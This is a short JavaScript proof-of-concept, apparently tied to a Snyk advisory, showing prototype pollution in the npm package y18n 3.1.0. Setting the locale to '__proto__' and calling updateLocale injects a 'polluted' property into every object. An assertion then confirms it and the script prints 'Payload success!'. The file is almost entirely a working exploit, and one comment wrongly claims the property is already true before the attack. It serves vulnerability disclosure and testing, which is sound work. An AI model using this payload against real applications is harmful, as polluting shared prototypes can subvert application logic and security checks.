//https://snyk.io/test/npm/y18n/3.1.0

const y18n = require('y18n')();
const assert = require('assert');


console.log("Before",{}.polluted); // true
y18n.setLocale('__proto__');
y18n.updateLocale({polluted: "yes"});//payload

console.log("After",{}.polluted); // true
assert({}.polluted === "yes");
console.log("Payload success!")
